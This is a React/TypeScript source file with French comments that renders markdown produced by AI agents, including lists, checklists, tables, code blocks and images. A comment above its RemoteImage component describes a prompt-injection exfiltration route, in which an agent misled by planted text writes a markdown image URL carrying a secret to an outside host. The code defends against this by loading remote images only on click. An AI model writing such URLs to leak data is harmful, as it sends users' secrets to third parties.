import { ImageDown } from "lucide-react";
import { Fragment, useMemo, useState } from "react";
import { Diagram } from "@/components/Diagram";
import { FileLink, isPath, linkifyPaths, resolvePath } from "@/components/FileLink";
import { LocalImage } from "@/components/LocalImage";
import { openLightbox } from "@/components/Lightbox";
import { api } from "@/lib/ipc";

/**
 * Rendu markdown sans dépendance, taillé pour ce qu'on lit vraiment ici : des
 * livrables d'agents — plans, revues, QA, wiki. Aucun HTML brut n'est
 * interprété, tout passe par React, donc rien n'est injectable.
 *
 * Ce qui compte pour ces documents : les listes imbriquées (les plans en sont
 * faits), les cases à cocher (les checklists de QA), les tableaux, et des liens
 * réellement cliquables.
 */

type Block =
	| { kind: "heading"; level: number; text: string }
	| { kind: "paragraph"; text: string }
	| { kind: "code"; language: string; text: string }
	| { kind: "list"; items: ListItem[] }
	| { kind: "quote"; text: string }
	| { kind: "rule" }
	| { kind: "table"; head: string[]; rows: string[][] };

interface ListItem {
	/** Profondeur d'imbrication, déduite de l'indentation. */
	depth: number;
	marker: string;
	text: string;
	/** `null` hors case à cocher, sinon son état. */
	checked: boolean | null;
}

const BULLET = /^(\s*)([-*+]|\d+[.)])\s+(.*)$/;

function parse(source: string): Block[] {
	const lines = source.replace(/\r\n/g, "\n").split("\n");
	const blocks: Block[] = [];
	let index = 0;

	while (index < lines.length) {
		const line = lines[index];

		if (line.trim() === "") {
			index += 1;
			continue;
		}

		if (line.trimStart().startsWith("```")) {
			const language = line.trim().slice(3).trim();
			const body: string[] = [];
			index += 1;
			while (index < lines.length && !lines[index].trimStart().startsWith("```")) {
				body.push(lines[index]);
				index += 1;
			}
			index += 1;
			blocks.push({ kind: "code", language, text: body.join("\n") });
			continue;
		}

		const heading = line.match(/^(#{1,6})\s+(.*)$/);
		if (heading) {
			blocks.push({ kind: "heading", level: heading[1].length, text: heading[2].trim() });
			index += 1;
			continue;
		}

		if (/^\s*(-{3,}|\*{3,}|_{3,})\s*$/.test(line)) {
			blocks.push({ kind: "rule" });
			index += 1;
			continue;
		}

		// Tableau : une ligne de cellules suivie d'une ligne de séparation.
		if (line.trimStart().startsWith("|") && /^[\s|:-]+$/.test(lines[index + 1] ?? "")) {
			const cells = (row: string) =>
				row
					.trim()
					.replace(/^\||\|$/g, "")
					.split("|")
					.map((cell) => cell.trim());
			const head = cells(line);
			index += 2;
			const rows: string[][] = [];
			while (index < lines.length && lines[index].trimStart().startsWith("|")) {
				rows.push(cells(lines[index]));
				index += 1;
			}
			blocks.push({ kind: "table", head, rows });
			continue;
		}

		if (BULLET.test(line)) {
			const items: ListItem[] = [];
			while (index < lines.length) {
				const match = lines[index].match(BULLET);
				if (!match) {
					// Une ligne indentée qui suit un point prolonge son texte.
					const continuation = lines[index].match(/^\s{2,}(\S.*)$/);
					if (continuation && items.length > 0) {
						items[items.length - 1].text += ` ${continuation[1]}`;
						index += 1;
						continue;
					}
					break;
				}
				const [, indent, marker, rest] = match;
				const task = rest.match(/^\[([ xX])\]\s+(.*)$/);
				items.push({
					// Deux espaces par niveau, mais on tolère les tabulations et
					// les indentations à quatre espaces.
					depth: Math.min(4, Math.floor(indent.replace(/\t/g, "  ").length / 2)),
					marker,
					checked: task ? task[1].toLowerCase() === "x" : null,
					text: task ? task[2] : rest,
				});
				index += 1;
			}
			blocks.push({ kind: "list", items });
			continue;
		}

		if (line.trimStart().startsWith(">")) {
			const body: string[] = [];
			while (index < lines.length && lines[index].trimStart().startsWith(">")) {
				body.push(lines[index].replace(/^\s*>\s?/, ""));
				index += 1;
			}
			blocks.push({ kind: "quote", text: body.join(" ") });
			continue;
		}

		const paragraph: string[] = [];
		while (
			index < lines.length &&
			lines[index].trim() !== "" &&
			!lines[index].startsWith("#") &&
			!lines[index].trimStart().startsWith("```") &&
			!lines[index].trimStart().startsWith(">") &&
			!lines[index].trimStart().startsWith("|") &&
			!BULLET.test(lines[index])
		) {
			paragraph.push(lines[index].trim());
			index += 1;
		}
		if (paragraph.length > 0) {
			blocks.push({ kind: "paragraph", text: paragraph.join(" ") });
		} else {
			index += 1;
		}
	}

	return blocks;
}

/**
 * Gras, italique, code, liens, barré — sur une seule ligne.
 *
 * Exporté parce que tout ce qu'un agent écrit n'arrive pas en bloc markdown :
 * les rapports relus par le cockpit rendent des phrases déjà découpées, qui
 * portent les mêmes marques et méritent le même rendu. Sans lui, un `**` et des
 * accents graves s'affichaient tels quels.
 */
/** Les adresses déjà acceptées : un fil qui se redessine ne redemande pas. */
const acceptees = new Set<string>();

/**
 * Une image servie par le réseau ne se charge que sur un clic.
 *
 * Charger une URL, c'est l'appeler : un agent manipulé par un texte piégé
 * (ticket, page, fichier de dépôt) n'a qu'à écrire
 * `![](https://ailleurs/?d=<secret>)` pour qu'un affichage automatique envoie
 * la donnée dehors, sans que personne ait rien touché. On montre donc d'abord
 * à qui l'image serait demandée ; le clic décide.
 */
function RemoteImage({ src, alt, className }: { src: string; alt: string; className?: string }) {
	const [loaded, setLoaded] = useState(() => acceptees.has(src));
	if (loaded) return <img src={src} alt={alt} className={className} />;
	let hote = src;
	try {
		hote = new URL(src).host;
	} catch {
		// L'adresse brute, faute de mieux : c'est elle qui partirait.
	}
	return (
		<button
			type="button"
			title={src}
			onClick={(event) => {
				// Le cadre parent ouvre la visionneuse, qui chargerait l'image à
				// son tour : ce premier clic ne sert qu'à accepter.
				event.stopPropagation();
				acceptees.add(src);
				setLoaded(true);
			}}
			className="focus-ring inline-flex max-w-full cursor-pointer items-center gap-2 rounded-lg border border-dashed border-line px-3 py-2 text-left text-[12px] text-ink-muted transition-colors hover:border-ink-faint hover:text-ink"
		>
			<ImageDown className="h-4 w-4 shrink-0" />
			<span className="min-w-0 truncate">
				Charger l'image depuis <span className="font-mono text-ink">{hote}</span>
			</span>
		</button>
	);
}

export function Inline({ text, cwd }: { text: string; cwd?: string | null }) {
	// L'image passe avant le lien : sans quoi « ![vue](x.png) » se coupait en un
	// point d'exclamation suivi d'un lien, et cliquer dessus ne menait nulle part.
	const parts = text.split(
		/(!\[[^\]]*\]\([^)\s]+\)|`[^`]+`|\*\*[^*]+\*\*|__[^_]+__|~~[^~]+~~|\*[^*\n]+\*|\[[^\]]*\]\([^)\s]+\)|https?:\/\/\S+)/g,
	);

	return (
		<>
			{parts.map((part, index) => {
				const key = `${index}-${part.slice(0, 12)}`;
				if (!part) return null;

				// Une image annoncée en markdown est montrée. C'est ainsi qu'un
				// agent donne à voir ce qu'il a produit — une capture, un graphe —
				// et le fil n'en rendait qu'un lien inerte.
				const image = part.match(/^!\[([^\]]*)\]\(([^)\s]+)\)$/);
				if (image) {
					const source = image[2];
					const legende = image[1];
					// Une image déjà porteuse de ses octets, ou servie par le réseau,
					// s'affiche telle quelle : il n'y a pas de fichier à relire.
					const distante = /^(https?:\/\/|data:image\/)/.test(source);
					const cible = distante ? source : resolvePath(source, cwd).target;
					const nom = cible.split("/").pop() ?? cible;
					return (
						<span
							key={key}
							role="button"
							title="Voir en grand"
							onClick={() =>
								openLightbox([
									distante
										? { key: cible, kind: "image", src: cible, label: legende || nom }
										: { key: cible, kind: "image", path: cible, label: nom },
								])
							}
							className="my-1 block cursor-zoom-in"
						>
							{/^https?:\/\//.test(source) ? (
								<RemoteImage
									src={source}
									alt={legende}
									className="max-h-80 max-w-full rounded-lg border border-line-soft object-contain"
								/>
							) : distante ? (
								<img
									src={source}
									alt={legende}
									className="max-h-80 max-w-full rounded-lg border border-line-soft object-contain"
								/>
							) : (
								<LocalImage
									path={resolvePath(source, cwd).target}
									alt={legende}
									className="max-h-80 max-w-full rounded-lg border border-line-soft object-contain"
								/>
							)}
							{legende ? (
								<span className="mt-0.5 block text-[11px] text-ink-faint">{legende}</span>
							) : null}
						</span>
					);
				}

				if (part.startsWith("`") && part.endsWith("`") && part.length > 2) {
					const code = part.slice(1, -1);
					const style =
						"rounded bg-raised px-1 py-px font-mono text-[0.92em] text-accent-soft";
					// Un chemin entre accents graves est la façon dont les agents
					// citent un fichier neuf fois sur dix.
					if (isPath(code)) {
						return <FileLink key={key} path={code} cwd={cwd} className={style} />;
					}
					return (
						<code key={key} className={style}>
							{code}
						</code>
					);
				}
				if (
					(part.startsWith("**") && part.endsWith("**")) ||
					(part.startsWith("__") && part.endsWith("__"))
				) {
					return (
						<strong key={key} className="font-semibold text-ink">
							{part.slice(2, -2)}
						</strong>
					);
				}
				if (part.startsWith("~~") && part.endsWith("~~")) {
					return (
						<span key={key} className="text-ink-faint line-through">
							{part.slice(2, -2)}
						</span>
					);
				}
				if (part.startsWith("*") && part.endsWith("*") && part.length > 2) {
					return (
						<em key={key} className="italic">
							{part.slice(1, -1)}
						</em>
					);
				}

				const link = part.match(/^\[([^\]]*)\]\(([^)\s]+)\)$/);
				const url = link ? link[2] : part.startsWith("http") ? part : null;
				if (url) {
					return (
						<button
							key={key}
							type="button"
							onClick={() => {
								void api.system.openUrl(url).catch(() => undefined);
							}}
							className="text-accent-soft underline decoration-accent/30 hover:decoration-accent"
						>
							{link ? link[1] || url : url}
						</button>
					);
				}
				// Reste le texte nu, où les chemins sont cités sans être balisés :
				// « Écrit dans .claude/reviews/review-PR-1785.md ».
				return <Fragment key={key}>{linkifyPaths(part, cwd)}</Fragment>;
			})}
		</>
	);
}

const HEADING_STYLES = [
	"text-[18px] font-semibold text-ink",
	"text-[14px] font-semibold text-ink",
	"text-[13px] font-semibold text-ink",
	"text-[12.5px] font-semibold text-ink-muted",
];

export function Markdown({ source, cwd }: { source: string; cwd?: string | null }) {
	const blocks = useMemo(() => parse(source), [source]);

	return (
		<div className="text-selectable flex flex-col gap-3.5 text-[12.5px] leading-[1.7] text-ink-muted">
			{blocks.map((block, index) => {
				const key = `${block.kind}-${index}`;

				switch (block.kind) {
					case "heading": {
						const level = Math.min(block.level, 4);
						return (
							<h3
								key={key}
								className={[
									HEADING_STYLES[level - 1],
									"mt-3 tracking-[-0.01em] first:mt-0",
									// Un filet sous les deux premiers niveaux : sans lui, un
									// rapport long se lit comme un seul bloc.
									level <= 2 ? "border-b border-line-soft pb-1.5" : "",
								].join(" ")}
							>
								<Inline text={block.text} cwd={cwd} />
							</h3>
						);
					}

					case "code":
						// Un schéma se regarde : son texte ne sert qu'à le dessiner.
						if (block.language.toLowerCase() === "mermaid" && block.text.trim()) {
							return <Diagram key={key} source={block.text} />;
						}
						return (
							<div key={key} className="overflow-hidden rounded-lg border border-line-soft">
								{block.language ? (
									<div className="border-b border-line-soft bg-surface/60 px-3 py-1 font-mono text-[10px] text-ink-faint">
										{block.language}
									</div>
								) : null}
								<pre className="overflow-x-auto bg-void p-3 font-mono text-[11px] leading-relaxed text-ink-muted">
									<code>{block.text}</code>
								</pre>
							</div>
						);

					case "list":
						return (
							<ul key={key} className="flex flex-col gap-1">
								{block.items.map((item, itemIndex) => (
									<li
										key={`${key}-${itemIndex}`}
										className="flex gap-2"
										style={{ paddingLeft: item.depth * 18 }}
									>
										{item.checked === null ? (
											<span className="mt-[9px] size-1 shrink-0 rounded-full bg-ink-faint" />
										) : (
											<span
												className={[
													"mt-0.5 flex size-3.5 shrink-0 items-center justify-center rounded border font-mono text-[10px]",
													item.checked
														? "border-success/40 bg-success/15 text-success"
														: "border-line text-transparent",
												].join(" ")}
											>
												✓
											</span>
										)}
										<span
											className={[
												"min-w-0 flex-1",
												item.checked ? "text-ink-faint line-through" : "",
											].join(" ")}
										>
											{/^\d/.test(item.marker) ? (
												<span className="mr-1 font-mono text-ink-faint">{item.marker}</span>
											) : null}
											<Inline text={item.text} cwd={cwd} />
										</span>
									</li>
								))}
							</ul>
						);

					case "quote":
						return (
							<blockquote
								key={key}
								className="border-l-2 border-accent/40 pl-3 text-ink-faint italic"
							>
								<Inline text={block.text} cwd={cwd} />
							</blockquote>
						);

					case "rule":
						return <hr key={key} className="border-line-soft" />;

					case "table":
						return (
							<div key={key} className="overflow-x-auto rounded-lg border border-line-soft">
								<table className="w-full border-collapse text-[11px]">
									<thead>
										<tr className="border-b border-line-soft bg-surface/60">
											{block.head.map((cell, cellIndex) => (
												<th
													key={cellIndex}
													className="px-3 py-1.5 text-left font-medium whitespace-nowrap text-ink"
												>
													<Inline text={cell} cwd={cwd} />
												</th>
											))}
										</tr>
									</thead>
									<tbody>
										{block.rows.map((row, rowIndex) => (
											<tr
												key={rowIndex}
												className="border-b border-line-soft last:border-0"
											>
												{row.map((cell, cellIndex) => (
													<td key={cellIndex} className="px-3 py-1.5 align-top">
														<Inline text={cell} cwd={cwd} />
													</td>
												))}
											</tr>
										))}
									</tbody>
								</table>
							</div>
						);

					default:
						return (
							<p key={key}>
								<Inline text={block.text} cwd={cwd} />
							</p>
						);
				}
			})}
		</div>
	);
}
